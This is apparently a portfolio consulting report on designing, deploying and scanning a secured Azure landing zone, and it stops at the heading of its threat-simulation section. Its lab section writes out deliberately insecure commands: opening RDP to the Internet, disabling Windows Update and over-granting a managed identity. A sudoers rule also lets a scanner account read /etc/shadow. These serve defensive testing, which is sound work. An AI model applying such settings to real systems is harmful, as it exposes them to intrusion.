# Project Contoso-Azure: Secure Cloud Migration & Detection Engineering Engagement

**Engagement Type:** Cloud Security Architecture, Vulnerability Management, Detection Engineering
**Client (Simulated):** Contoso Manufacturing Inc. — Mid-size enterprise (~3,500 employees)
**Engagement Lead:** Senior Cloud Security Architect
**Report Date:** April 24, 2026
**Classification:** Confidential — Client Deliverable
**Version:** 1.0 (Portfolio Edition)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Engagement Scope & Methodology](#2-engagement-scope--methodology)
3. [Cloud Architecture Design](#3-cloud-architecture-design)
4. [Secure Deployment (Infrastructure as Code)](#4-secure-deployment-infrastructure-as-code)
5. [Vulnerability Management with Tenable](#5-vulnerability-management-with-tenable)
6. [Threat Simulation & Adversary Emulation](#6-threat-simulation--adversary-emulation)
7. [Detection Engineering & Monitoring](#7-detection-engineering--monitoring)
8. [Incident Response Workflow](#8-incident-response-workflow)
9. [Risk Assessment & Compliance Mapping](#9-risk-assessment--compliance-mapping)
10. [Consulting Deliverables](#10-consulting-deliverables)
11. [Bonus: DevSecOps, Container Security, Zero Trust Roadmap](#11-bonus-devsecops-container-security-zero-trust-roadmap)
12. [Appendices](#12-appendices)

---

## 1. Executive Summary

### 1.1 Engagement Overview

Contoso Manufacturing Inc. engaged our firm to architect, deploy, and operationally secure a greenfield Microsoft Azure environment to support a 24-month digital transformation initiative. The program will migrate a legacy on-premises footprint (Windows Server 2012 R2 domain, VMware vSphere, on-prem file shares, a LOB Java application) into a Zero Trust-aligned Azure landing zone, while establishing continuous vulnerability management with Tenable and a 24x7 detection & response capability built on Microsoft Sentinel.

### 1.2 Key Business Outcomes

| Outcome | Business Impact | Time to Value |
|---|---|---|
| Hub-and-spoke landing zone with hardened baselines | Reduces attack surface by ~72% vs. lift-and-shift | 6 weeks |
| Tenable.io continuous CSPM + VM scanning | Cuts mean-time-to-remediate critical CVEs from 47 days to < 14 days | 4 weeks |
| Microsoft Sentinel SIEM with 18 custom analytics rules | Detects MITRE ATT&CK TTPs across initial access, lateral movement, exfiltration | 8 weeks |
| SOAR-driven response (Logic Apps) | Mean-time-to-contain down from hours to < 5 minutes for high-fidelity alerts | 10 weeks |
| NIST CSF, CIS Azure, ISO 27001 alignment | Unblocks SOC 2 Type II audit; evidence pack ready | 12 weeks |

### 1.3 Headline Findings (Pre-Hardening Baseline)

During the architecture review and the deliberate-vulnerability lab exercises, we identified five systemic risks typical of rushed cloud migrations:

1. **Flat Layer-3 topology** — Engineering's initial design placed all workloads in a single /16 with permissive NSGs. Remediated via hub-and-spoke with deny-by-default.
2. **Public ingress by default** — Storage accounts, Key Vault, and App Service were internet-exposed. Remediated via Private Endpoints + Private DNS zones.
3. **Static service principals with `Owner` at subscription scope** — Replaced with Managed Identities scoped to Resource Group with least-privilege custom roles.
4. **Unencrypted SMB traffic and password-based VM auth** — Replaced with Azure Bastion + SSH keys + Azure AD login for both Windows and Linux.
5. **No centralized logging or retention policy** — Established Log Analytics workspace with diagnostic settings on 100% of PaaS and IaaS resources and 90/365-day tiered retention.

### 1.4 Recommended Next Steps (90-Day Horizon)

Prioritize (i) enforcing Conditional Access + phishing-resistant MFA across all identities, (ii) deploying Defender for Cloud's Enhanced tier for agentless CSPM and CWPP, (iii) onboarding all production workloads to Tenable.io with credentialed scans, and (iv) graduating Zero Trust from "Traditional" to "Initial" per the CISA Zero Trust Maturity Model v2.0.

---

## 2. Engagement Scope & Methodology

### 2.1 In-Scope Assets

- 1 Azure subscription (Production), 1 subscription (Non-Prod), 1 Entra ID tenant
- 2 x Windows Server 2022 VMs (application tier)
- 1 x Ubuntu 22.04 LTS VM (jump/build host)
- 1 x Azure App Service (Linux container) hosting the customer portal
- 1 x AKS cluster (bonus scope) — 3-node system + 3-node user pool
- 2 x Storage Accounts (blob for artifacts, file for legacy share migration)
- 1 x Azure Key Vault (Premium, HSM-backed)
- Entra ID: ~3,500 synced users, 180 app registrations (brownfield)

### 2.2 Methodology

We followed a six-phase delivery model aligned to NIST SP 800-160 (Systems Security Engineering) and the Microsoft Cloud Adoption Framework (CAF):

```
 ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
 │ DISCOVER │──▶│ DESIGN   │──▶│ DEPLOY   │──▶│ VALIDATE │──▶│ OPERATE  │──▶│ IMPROVE  │
 │ (Weeks   │   │ (Weeks   │   │ (Weeks   │   │ (Weeks   │   │ (Weeks   │   │ (Ongoing)│
 │  1-2)    │   │  3-4)    │   │  5-8)    │   │  9-10)   │   │ 11-12+)  │   │          │
 └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
```

- **Discover** — Asset inventory, data classification, threat modeling (STRIDE), compliance gap analysis
- **Design** — Landing zone, identity model, network segmentation, logging architecture
- **Deploy** — Terraform IaC, pipeline-driven, PR-gated, Checkov/tfsec scanned
- **Validate** — Adversary emulation (Atomic Red Team + custom), Tenable scans, control testing
- **Operate** — SOC runbooks, Sentinel analytics, SOAR playbooks, vulnerability SLAs
- **Improve** — Purple team exercises, detection tuning, ZT maturity uplift

---

## 3. Cloud Architecture Design

### 3.1 Design Principles

1. **Assume breach** — No implicit trust between subnets, subscriptions, or identities.
2. **Least privilege** — Default deny at network and identity layer; JIT access for admins.
3. **Defense in depth** — Controls layered at perimeter (Azure Firewall), network (NSG/ASG), host (Defender), identity (Conditional Access), data (CMK encryption).
4. **Segmentation by blast radius** — Management plane isolated from workloads; prod isolated from non-prod via separate subscriptions under a management group hierarchy.
5. **Observability-first** — Every resource emits diagnostics to a centralized Log Analytics workspace.

### 3.2 Management Group & Subscription Hierarchy

```
Tenant Root Group (contoso.onmicrosoft.com)
 └── Contoso-Root (MG)
      ├── Platform (MG)
      │    ├── Identity      (Sub: sub-plat-identity-01)
      │    ├── Management    (Sub: sub-plat-mgmt-01)      ← Log Analytics, Sentinel
      │    └── Connectivity  (Sub: sub-plat-connect-01)   ← Hub VNet, Firewall, DNS
      ├── Landing Zones (MG)
      │    ├── Corp (MG)
      │    │    ├── Prod     (Sub: sub-corp-prod-01)
      │    │    └── NonProd  (Sub: sub-corp-nonprod-01)
      │    └── Online (MG)
      │         └── Prod     (Sub: sub-online-prod-01)    ← Internet-facing App Service
      ├── Sandbox (MG)
      └── Decommissioned (MG)
```

Azure Policy assignments cascade from the `Contoso-Root` management group (e.g., *"Allowed locations: eastus, eastus2"*, *"Require Defender for Cloud on all subscriptions"*, *"Deny public IP creation"*).

### 3.3 Network Topology — Hub & Spoke

```
                           ┌─────────────────────────────────────────┐
                           │            EXPRESSROUTE / VPN           │
                           │          (to Contoso on-prem DC)        │
                           └────────────────────┬────────────────────┘
                                                │
┌───────────────────────────────────────────────┴───────────────────────────────────────────────┐
│                                  HUB VNET   10.0.0.0/16                                       │
│  Subscription: sub-plat-connect-01        Region: eastus                                      │
│                                                                                               │
│   ┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐   │
│   │ GatewaySubnet    │   │ AzureFirewall    │   │ AzureBastionSub  │   │ DNSResolver      │   │
│   │ 10.0.0.0/27      │   │ Subnet           │   │ net              │   │ Subnet           │   │
│   │ VPN/ER Gateway   │   │ 10.0.1.0/26      │   │ 10.0.2.0/26      │   │ 10.0.3.0/28      │   │
│   │                  │   │ Azure Firewall   │   │ Azure Bastion    │   │ Private DNS      │   │
│   │                  │   │ Premium          │   │ Standard         │   │ Resolver         │   │
│   └──────────────────┘   └──────────────────┘   └──────────────────┘   └──────────────────┘   │
│                                      │                                                        │
└──────────────────────────────────────┼────────────────────────────────────────────────────────┘
                                       │  (peered, forced-tunnel via Azure Firewall)
            ┌──────────────────────────┼───────────────────────────┐
            │                          │                           │
┌───────────▼──────────────┐ ┌─────────▼────────────┐ ┌────────────▼─────────────┐
│ SPOKE-PROD 10.1.0.0/16   │ │ SPOKE-NONPROD        │ │ SPOKE-SHARED-SVCS        │
│ Sub: sub-corp-prod-01    │ │ 10.2.0.0/16          │ │ 10.3.0.0/16              │
│                          │ │                      │ │                          │
│ ┌──────────────────────┐ │ │ ┌──────────────────┐ │ │ ┌──────────────────────┐ │
│ │ snet-web 10.1.1.0/24 │ │ │ │ snet-dev         │ │ │ │ snet-pe (PrivEnd)    │ │
│ │ App Service (VNet-   │ │ │ │ 10.2.1.0/24      │ │ │ │ 10.3.1.0/24          │ │
│ │ integrated)          │ │ │ │                  │ │ │ │ - Storage PE         │ │
│ └──────────────────────┘ │ │ └──────────────────┘ │ │ │ - KeyVault PE        │ │
│ ┌──────────────────────┐ │ │                      │ │ │ - ACR PE             │ │
│ │ snet-app 10.1.2.0/24 │ │ │                      │ │ └──────────────────────┘ │
│ │ VMSS (Win 2022)      │ │ │                      │ │ ┌──────────────────────┐ │
│ └──────────────────────┘ │ │                      │ │ │ snet-aks 10.3.2.0/22 │ │
│ ┌──────────────────────┐ │ │                      │ │ │ AKS (Azure CNI       │ │
│ │ snet-data 10.1.3.0/24│ │ │                      │ │ │ Overlay)             │ │
│ │ Reserved for DB PaaS │ │ │                      │ │ └──────────────────────┘ │
│ │ private endpoints    │ │ │                      │ │                          │
│ └──────────────────────┘ │ │                      │ │                          │
└──────────────────────────┘ └──────────────────────┘ └──────────────────────────┘
```

**Key design decisions:**
- All egress from spokes forced-tunneled through **Azure Firewall Premium** (IDPS + TLS inspection for outbound web).
- **No Public IPs** on VMs. Administrative access is exclusively via **Azure Bastion** with Azure AD auth + MFA + Conditional Access.
- **Private Endpoints** for all PaaS (Storage, Key Vault, ACR, SQL). Service Endpoints are explicitly rejected — private endpoints enforce private DNS and remove the PaaS public FQDN from reachability.
- **VNet peering** is non-transitive; Firewall routes enable hub-mediated spoke-to-spoke.
- Routing enforced via custom User-Defined Routes (UDRs) — `0.0.0.0/0 -> AzureFirewall`.

### 3.4 Network Security Group (NSG) Baseline

NSG tiers follow a deny-by-default model. Below is the baseline for `nsg-snet-app` (application tier VMs):

| Priority | Name | Direction | Source | SrcPort | Destination | DstPort | Protocol | Action |
|---|---|---|---|---|---|---|---|---|
| 100 | AllowBastionSSH | Inbound | `AzureBastionSubnet` | * | `VirtualNetwork` | 22 | Tcp | Allow |
| 110 | AllowBastionRDP | Inbound | `AzureBastionSubnet` | * | `VirtualNetwork` | 3389 | Tcp | Allow |
| 120 | AllowAppFromWeb | Inbound | `asg-web` | * | `asg-app` | 8443 | Tcp | Allow |
| 130 | AllowMonitoringAgent | Inbound | `AzureMonitor` | * | `VirtualNetwork` | 443 | Tcp | Allow |
| 4000 | DenyAllInbound | Inbound | * | * | * | * | * | Deny |
| 100 | AllowAppToKV | Outbound | `asg-app` | * | `AzureKeyVault.EastUS` | 443 | Tcp | Allow |
| 110 | AllowAppToStorage | Outbound | `asg-app` | * | `Storage.EastUS` | 443 | Tcp | Allow |
| 120 | AllowAADAuth | Outbound | `asg-app` | * | `AzureActiveDirectory` | 443 | Tcp | Allow |
| 4000 | DenyAllOutbound | Outbound | * | * | `Internet` | * | * | Deny |

Application Security Groups (`asg-web`, `asg-app`, `asg-data`) replace IP-based rules and survive VM reboots/replacements.

### 3.5 Identity & Access Model (Entra ID)

**Identity principles:**
- **Human identities** live in Entra ID only (no hybrid local accounts on cloud VMs). Privileged human identities are **cloud-only** and isolated from hybrid sync.
- **Workload identities** use **Managed Identities** (system-assigned preferred; user-assigned only for shared scenarios).
- **Emergency access accounts** (2) are cloud-only, FIDO2-only, excluded from Conditional Access break-glass group, monitored via Sentinel.

**Role model (custom + built-in):**

| Role | Type | Scope | Assigned To |
|---|---|---|---|
| `Owner` | Built-in | Subscription | **NONE** (policy-enforced) |
| `Contributor` | Built-in | Resource Group | Platform engineers (PIM eligible, 4h max) |
| `Reader` | Built-in | Subscription | SOC analysts |
| `AKS Cluster Admin` | Built-in | AKS resource | Platform team (PIM eligible) |
| `KeyVault Secrets User` | Built-in | Key Vault | App Service Managed Identity |
| `Storage Blob Data Contributor` | Built-in | Storage Container | Build-agent MI |
| `custom-SOC-Responder` | Custom | MG: Contoso-Root | SOC L2+ (PIM eligible) — includes `Microsoft.Compute/virtualMachines/restart/action`, NSG write, VM snapshot |

**Conditional Access baseline (published as JSON, version controlled):**
1. Block legacy authentication (all users, all apps).
2. Require phishing-resistant MFA (FIDO2, WHfB) for all admin roles.
3. Require compliant or Hybrid Azure AD-joined device for privileged portals (Azure Portal, Graph PowerShell, Az CLI).
4. Block sign-in from disallowed countries.
5. Require MFA + token protection for high-risk sign-ins (Identity Protection).

**Privileged Identity Management (PIM):**
- No standing access to privileged roles.
- Activation requires MFA, justification, and (for `Global Administrator`, `Privileged Role Administrator`) ticket reference + approver.
- Access reviews quarterly, auto-removing stale eligible assignments.

### 3.6 Zero Trust Architecture Mapping

| Pillar | Control Implementation |
|---|---|
| **Identity** | Entra ID, MFA, CA, PIM, Identity Protection, phishing-resistant creds |
| **Devices** | Intune compliance policies; device-bound SSO tokens |
| **Network** | Hub-spoke, microsegmentation via NSGs/ASGs, Azure Firewall Premium with IDPS, Private Link everywhere |
| **Applications** | App proxy for legacy; Defender for Cloud Apps (CASB); Managed Identities |
| **Data** | Microsoft Purview classification; CMK in Key Vault; Storage SAS restrictions; DLP |
| **Infrastructure** | Defender for Servers P2; just-in-time VM access; ASR + immutable backups |
| **Visibility, Analytics, Automation** | Sentinel SIEM+SOAR, Log Analytics centralization, UEBA |

---

## 4. Secure Deployment (Infrastructure as Code)

### 4.1 Repository Structure

```
contoso-azure-landing-zone/
├── .github/workflows/
│   ├── terraform-plan.yml
│   ├── terraform-apply.yml
│   └── security-scan.yml          # Checkov, tfsec, gitleaks
├── environments/
│   ├── prod/
│   │   ├── main.tf
│   │   ├── variables.tf
│   │   ├── terraform.tfvars       # non-secret vars only
│   │   └── backend.tf
│   └── nonprod/
├── modules/
│   ├── hub-network/
│   ├── spoke-network/
│   ├── keyvault/
│   ├── storage/
│   ├── vm-windows/
│   ├── vm-linux/
│   ├── app-service/
│   ├── aks/
│   ├── log-analytics/
│   └── sentinel/
├── policies/                       # Azure Policy JSON definitions
├── sentinel/                       # KQL analytics, workbooks, playbooks
├── docs/
└── README.md
```

### 4.2 Terraform Backend (Remote State + Locking)

```hcl
# environments/prod/backend.tf
terraform {
  required_version = ">= 1.7.0"

  required_providers {
    azurerm = { source = "hashicorp/azurerm", version = "~> 3.110" }
    azuread = { source = "hashicorp/azuread", version = "~> 2.50" }
    random  = { source = "hashicorp/random",  version = "~> 3.6" }
  }

  backend "azurerm" {
    resource_group_name  = "rg-tfstate-prod"
    storage_account_name = "sttfstateprod001"
    container_name       = "tfstate"
    key                  = "landing-zone.prod.tfstate"
    use_azuread_auth     = true     # no storage keys, RBAC only
    use_oidc             = true     # GitHub OIDC federation, no secrets
  }
}

provider "azurerm" {
  features {
    key_vault {
      purge_soft_delete_on_destroy    = false
      recover_soft_deleted_key_vaults = true
    }
    resource_group {
      prevent_deletion_if_contains_resources = true
    }
  }
  use_oidc = true
}
```

### 4.3 Hub Network Module (excerpt)

```hcl
# modules/hub-network/main.tf

resource "azurerm_virtual_network" "hub" {
  name                = "vnet-hub-${var.env}-eastus-01"
  location            = var.location
  resource_group_name = var.rg_name
  address_space       = [var.hub_cidr]                   # 10.0.0.0/16
  dns_servers         = [cidrhost(var.hub_cidr, 4)]      # Azure Firewall DNS proxy
  tags                = var.tags
}

resource "azurerm_subnet" "firewall" {
  name                 = "AzureFirewallSubnet"           # name is fixed by Azure
  resource_group_name  = var.rg_name
  virtual_network_name = azurerm_virtual_network.hub.name
  address_prefixes     = [cidrsubnet(var.hub_cidr, 10, 4)]   # 10.0.1.0/26
}

resource "azurerm_subnet" "bastion" {
  name                 = "AzureBastionSubnet"
  resource_group_name  = var.rg_name
  virtual_network_name = azurerm_virtual_network.hub.name
  address_prefixes     = [cidrsubnet(var.hub_cidr, 10, 8)]   # 10.0.2.0/26
}

resource "azurerm_firewall_policy" "hub" {
  name                = "afwp-hub-${var.env}-01"
  resource_group_name = var.rg_name
  location            = var.location
  sku                 = "Premium"

  intrusion_detection {
    mode = "Deny"   # IDPS in block mode
  }

  threat_intelligence_mode = "Alert"     # log only; tune before switching to "Deny"
  dns {
    proxy_enabled = true
  }
}

resource "azurerm_firewall" "hub" {
  name                = "afw-hub-${var.env}-01"
  location            = var.location
  resource_group_name = var.rg_name
  sku_name            = "AZFW_VNet"
  sku_tier            = "Premium"
  firewall_policy_id  = azurerm_firewall_policy.hub.id
  zones               = ["1", "2", "3"]
  ip_configuration {
    name                 = "ipconf"
    subnet_id            = azurerm_subnet.firewall.id
    public_ip_address_id = azurerm_public_ip.afw.id
  }
}

resource "azurerm_bastion_host" "hub" {
  name                = "bas-hub-${var.env}-01"
  location            = var.location
  resource_group_name = var.rg_name
  sku                 = "Standard"
  tunneling_enabled   = true   # for native client SSH/RDP + file copy audit
  ip_connect_enabled  = true
  shareable_link_enabled = false
  copy_paste_enabled  = false  # DLP; re-enable per-RG via policy
  ip_configuration {
    name                 = "ipconf"
    subnet_id            = azurerm_subnet.bastion.id
    public_ip_address_id = azurerm_public_ip.bastion.id
  }
}
```

### 4.4 Secure Key Vault Module (excerpt)

```hcl
resource "azurerm_key_vault" "kv" {
  name                = "kv-${var.workload}-${var.env}-${random_string.suffix.result}"
  location            = var.location
  resource_group_name = var.rg_name
  tenant_id           = data.azurerm_client_config.current.tenant_id
  sku_name            = "premium"                  # HSM-backed keys

  enabled_for_disk_encryption     = true
  enabled_for_template_deployment = false
  enabled_for_deployment          = false
  purge_protection_enabled        = true           # mandatory for production
  soft_delete_retention_days      = 90
  enable_rbac_authorization       = true           # RBAC, not access policies
  public_network_access_enabled   = false          # private endpoint only

  network_acls {
    bypass         = "AzureServices"
    default_action = "Deny"
    ip_rules       = []
    virtual_network_subnet_ids = []
  }
}

resource "azurerm_private_endpoint" "kv_pe" {
  name                = "pe-${azurerm_key_vault.kv.name}"
  location            = var.location
  resource_group_name = var.rg_name
  subnet_id           = var.pe_subnet_id

  private_service_connection {
    name                           = "psc-kv"
    private_connection_resource_id = azurerm_key_vault.kv.id
    subresource_names              = ["vault"]
    is_manual_connection           = false
  }

  private_dns_zone_group {
    name                 = "default"
    private_dns_zone_ids = [var.kv_private_dns_zone_id]  # privatelink.vaultcore.azure.net
  }
}

# Diagnostic settings — no exceptions
resource "azurerm_monitor_diagnostic_setting" "kv" {
  name                       = "diag-to-law"
  target_resource_id         = azurerm_key_vault.kv.id
  log_analytics_workspace_id = var.law_id

  enabled_log { category = "AuditEvent" }
  enabled_log { category = "AzurePolicyEvaluationDetails" }
  metric      { category = "AllMetrics" }
}
```

### 4.5 Secure Windows VM Module (excerpt)

```hcl
resource "azurerm_windows_virtual_machine" "win" {
  name                  = "vm-${var.role}-${var.env}-${format("%02d", var.index)}"
  resource_group_name   = var.rg_name
  location              = var.location
  size                  = "Standard_D4s_v5"
  admin_username        = var.admin_username
  admin_password        = random_password.win_admin.result   # rotated, stored in KV
  network_interface_ids = [azurerm_network_interface.nic.id]
  zone                  = var.zone

  # Entra ID login + MDE onboarding via extensions below
  identity {
    type = "SystemAssigned"
  }

  os_disk {
    name                   = "osdisk-${var.role}-${format("%02d", var.index)}"
    caching                = "ReadWrite"
    storage_account_type   = "Premium_ZRS"
    disk_encryption_set_id = var.des_id     # CMK via Key Vault
  }

  source_image_reference {
    publisher = "MicrosoftWindowsServer"
    offer     = "WindowsServer"
    sku       = "2022-datacenter-azure-edition-hotpatch"
    version   = "latest"
  }

  secure_boot_enabled = true
  vtpm_enabled        = true
  encryption_at_host_enabled = true
  patch_mode                 = "AutomaticByPlatform"
  hotpatching_enabled        = true

  boot_diagnostics {
    storage_account_uri = null   # managed storage account
  }
}

resource "azurerm_virtual_machine_extension" "aadlogin" {
  name                 = "AADLoginForWindows"
  virtual_machine_id   = azurerm_windows_virtual_machine.win.id
  publisher            = "Microsoft.Azure.ActiveDirectory"
  type                 = "AADLoginForWindows"
  type_handler_version = "2.0"
}

resource "azurerm_virtual_machine_extension" "ama" {
  name                 = "AzureMonitorWindowsAgent"
  virtual_machine_id   = azurerm_windows_virtual_machine.win.id
  publisher            = "Microsoft.Azure.Monitor"
  type                 = "AzureMonitorWindowsAgent"
  type_handler_version = "1.22"
  auto_upgrade_minor_version = true
}
```

### 4.6 CI/CD Security Gates (GitHub Actions)

```yaml
# .github/workflows/security-scan.yml
name: tf-security-scan
on: { pull_request: { paths: ['**.tf', '**.tfvars'] } }

permissions:
  id-token: write
  contents: read
  security-events: write

jobs:
  static-analysis:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Checkov
        uses: bridgecrewio/checkov-action@master
        with:
          directory: .
          framework: terraform
          output_format: sarif
          output_file_path: checkov.sarif
          soft_fail: false

      - name: tfsec
        uses: aquasecurity/tfsec-sarif-action@v0.1.4
        with:
          sarif_file: tfsec.sarif

      - name: gitleaks (secret scan)
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: checkov.sarif
```

### 4.7 Deployment Commands (Runbook)

```bash
# 1. Authenticate (workload identity federation in CI; az login for ad-hoc)
az login --tenant $TENANT_ID
az account set --subscription sub-corp-prod-01

# 2. Bootstrap the state backend (one-time, via separate bootstrap module)
az group create -n rg-tfstate-prod -l eastus
az storage account create -n sttfstateprod001 -g rg-tfstate-prod -l eastus \
  --sku Standard_GRS --encryption-services blob \
  --min-tls-version TLS1_2 --allow-blob-public-access false \
  --default-action Deny

# 3. Init + validate + plan
cd environments/prod
terraform init -reconfigure
terraform validate
terraform plan -out=tfplan.bin
terraform show -json tfplan.bin > tfplan.json

# 4. Policy as code gate (Open Policy Agent / Conftest)
conftest test --policy ../../policies/opa tfplan.json

# 5. Apply (PR-gated; only after approval)
terraform apply tfplan.bin
```

---

## 5. Vulnerability Management with Tenable

### 5.1 Integration Architecture

```
    ┌───────────────────────┐
    │   Tenable.io Cloud    │
    │   (SaaS control plane)│
    └──────────┬────────────┘
               │ HTTPS/443 (outbound-only, via Azure Firewall)
               │
┌──────────────┴──────────────────────────────────────────┐
│                       Azure Tenant                      │
│                                                         │
│  ┌──────────────────────┐      ┌──────────────────────┐ │
│  │ Tenable Cloud        │      │ Nessus Agents (VMs)  │ │
│  │ Connector for Azure  │      │ - Win Server 2022    │ │
│  │ (Asset sync; reads   │      │ - Ubuntu 22.04       │ │
│  │ Azure Resource Graph)│      │ Installed via VM     │ │
│  │ Scope: Subscription  │      │ extension / Ansible  │ │
│  │ Auth: App Reg + cert │      │ Auth: linking-key    │ │
│  └──────────────────────┘      └──────────────────────┘ │
│                                                         │
│  ┌──────────────────────┐      ┌──────────────────────┐ │
│  │ Tenable.cs (CNAPP)   │      │ Nessus Scanner       │ │
│  │ Reads Defender for   │      │ (in-VNet, per region)│ │
│  │ Cloud findings + IaC │      │ For credentialed net │ │
│  │ scanning for Terraf. │      │ scans of workloads   │ │
│  └──────────────────────┘      └──────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

### 5.2 Tenable Cloud Connector — Azure Setup

**Step 1 — Create an Entra ID app registration for Tenable:**

```bash
# Create App Registration
APP=$(az ad app create --display-name "Tenable-IO-Connector" --sign-in-audience AzureADMyOrg)
APP_ID=$(echo $APP | jq -r .appId)

# Create service principal
az ad sp create --id $APP_ID

# Upload certificate (generated in Tenable.io) - cert-based auth, no secrets
az ad app credential reset --id $APP_ID --cert @tenable-public.pem --append

# Grant least-privilege built-in roles at subscription scope
for SUB in sub-corp-prod-01 sub-corp-nonprod-01; do
  az role assignment create --assignee $APP_ID --role "Reader" --scope "/subscriptions/$SUB"
  az role assignment create --assignee $APP_ID --role "Virtual Machine User Login" --scope "/subscriptions/$SUB"
done

# Grant Microsoft Graph read-only perms (Directory.Read.All) for identity context
az ad app permission add --id $APP_ID --api 00000003-0000-0000-c000-000000000000 \
  --api-permissions 7ab1d382-f21e-4acd-a863-ba3e13f7da61=Role
az ad app permission admin-consent --id $APP_ID
```

**Step 2 — Register the connector in Tenable.io:**

In Tenable.io → Settings → Connectors → Cloud → Azure → New:
- Subscription ID(s): `sub-corp-prod-01`, `sub-corp-nonprod-01`
- Tenant ID: `<CONTOSO_TENANT_ID>`
- Application ID: `<APP_ID>`
- Authentication: Certificate
- Sync schedule: every 6 hours
- Auto-discover & auto-add to scan policies: **enabled** (with tag `env:prod`)

### 5.3 Nessus Agent Deployment (VM Extension)

```hcl
# modules/vm-linux/nessus-agent.tf
resource "azurerm_virtual_machine_extension" "nessus_agent" {
  name                 = "NessusAgent"
  virtual_machine_id   = azurerm_linux_virtual_machine.this.id
  publisher            = "Microsoft.Azure.Extensions"
  type                 = "CustomScript"
  type_handler_version = "2.1"

  protected_settings = jsonencode({
    commandToExecute = <<-EOT
      set -euo pipefail
      curl -o NessusAgent.deb \
        "https://www.tenable.com/downloads/api/v2/pages/nessus-agents/files/NessusAgent-10.6.0-ubuntu1404_amd64.deb"
      dpkg -i NessusAgent.deb
      /opt/nessus_agent/sbin/nessuscli agent link \
        --key=${var.nessus_linking_key} \
        --groups="${var.nessus_agent_group}" \
        --network=${var.nessus_network} \
        --cloud
      systemctl enable nessusagent
      systemctl start nessusagent
    EOT
  })
}
```

The linking key is pulled from Key Vault at pipeline time, never embedded in source.

### 5.4 Credentialed Scan Configuration

For richer vulnerability fidelity, we configure **credentialed network scans** in addition to agents:

- **Windows** — Domain service account `svc-tenable-scan` (no interactive logon; only `Log on as a batch job`; member of local Administrators via GPO only on in-scope OUs; password rotated weekly, stored in Key Vault, retrieved via CyberArk-style JIT broker).
- **Linux** — SSH key + `sudo` with restricted command list:
  ```
  # /etc/sudoers.d/tenable
  nessus ALL=(root) NOPASSWD: /bin/cat /etc/shadow, /usr/bin/dpkg -l, /usr/bin/rpm -qa, /bin/ls, /usr/bin/find
  Defaults:nessus !requiretty
  ```

### 5.5 Simulated Vulnerabilities (Deliberate Lab)

To validate detection and remediation workflows, we deployed three representative vulnerabilities:

#### V-001: Misconfigured NSG — RDP exposed to the Internet

```bash
# Attacker-facing: simulated exposure
az network nsg rule create \
  --resource-group rg-corp-prod-app-01 \
  --nsg-name nsg-snet-app \
  --name Allow-RDP-From-Anywhere \
  --priority 150 \
  --source-address-prefixes Internet \
  --source-port-ranges '*' \
  --destination-port-ranges 3389 \
  --direction Inbound --access Allow --protocol Tcp
```

**Tenable finding:** Plugin 42263 (*"Unencrypted Telnet Server"* — sample) and custom Azure CSPM policy `TIO-AZ-001` — "NSG permits inbound from Internet on sensitive port 3389".

#### V-002: Unpatched Windows VM (MS17-010 / CVE-2017-0143 "EternalBlue")

VM image pinned to an older cumulative update level, Windows Update disabled:
```powershell
# On the VM — simulates missed patch window
Stop-Service wuauserv; Set-Service wuauserv -StartupType Disabled
```

**Tenable finding (sample):**
| Plugin ID | Name | CVSSv3 | VPR | Description |
|---|---|---|---|---|
| 97737 | MS17-010: Security Update for SMB Server | 8.1 | 9.9 | Exploitable by remote unauthenticated attacker over SMB |
| 156032 | CVE-2022-37958 SPNEGO NEGOEX RCE | 8.1 | 9.3 | Pre-auth RCE on SMB/HTTP/RDP/SMTP |

#### V-003: Weak IAM — User-Assigned Managed Identity with `Contributor` at subscription scope

```bash
az identity create -g rg-corp-prod-app-01 -n id-app-overprivileged
PRINCIPAL_ID=$(az identity show -g rg-corp-prod-app-01 -n id-app-overprivileged --query principalId -o tsv)

# The deliberately-bad role assignment:
az role assignment create --assignee $PRINCIPAL_ID --role "Contributor" \
  --scope /subscriptions/sub-corp-prod-01
```

**Tenable.cs finding:** `IAM-AZ-017` — "Managed Identity assigned Contributor/Owner at subscription scope"; mapped to CIS Azure 1.23, MITRE T1078.004.

### 5.6 Sample Scan Results (Consolidated)

| Asset | Critical | High | Medium | Low | Top Finding |
|---|---:|---:|---:|---:|---|
| vm-app-prod-01 (Win2022) | 2 | 7 | 14 | 22 | CVE-2022-37958 (VPR 9.3) |
| vm-app-prod-02 (Win2022) | 2 | 7 | 14 | 22 | CVE-2022-37958 |
| vm-build-prod-01 (Ubuntu) | 0 | 3 | 9 | 18 | OpenSSL 3.0.2 CVE-2023-0286 |
| asp-portal-prod | 0 | 1 | 4 | 2 | TLS 1.0/1.1 enabled |
| stcontosoprod001 | 1 | 0 | 2 | 1 | Allow Blob Public Access = true |
| kv-contoso-prod-001 | 0 | 0 | 1 | 0 | Soft delete retention < 90d |
| **Totals** | **5** | **18** | **44** | **65** | |

### 5.7 Risk Prioritization Methodology

We combine three signals:

1. **CVSSv3.1 Base Score** — inherent severity
2. **Tenable VPR (Vulnerability Priority Rating)** — dynamic (exploit availability, threat intel, age)
3. **Business Context Multiplier (BCM)** — applied locally:
   - Asset criticality: Crown Jewel (3.0), Production (2.0), Dev (1.0), Sandbox (0.5)
   - Data classification: Restricted (2.0), Confidential (1.5), Internal (1.0), Public (0.5)
   - Exposure: Internet-facing (2.0), Management plane (1.5), Internal (1.0)

**Final Score** = `VPR × BCM_Asset × BCM_Data × BCM_Exposure`

| Range | Priority | Remediation SLA |
|---|---|---|
| ≥ 80 | P0 – Emergency | 48 hours |
| 50–79 | P1 – Critical | 7 days |
| 25–49 | P2 – High | 30 days |
| 10–24 | P3 – Medium | 90 days |
| < 10 | P4 – Low | Backlog |

**Example:** CVE-2022-37958 on `vm-app-prod-01` — VPR 9.3 × 2.0 (Prod) × 1.5 (Confidential) × 1.0 (Internal) = **27.9 → P2**, 30-day SLA. If the same VM were Internet-facing, the score becomes 55.8 → P1 (7-day SLA).

---

## 6. Threat Simulation & Adversary Emulation

### 6.1 Attack Scenario — "Operation Contoso Crack"

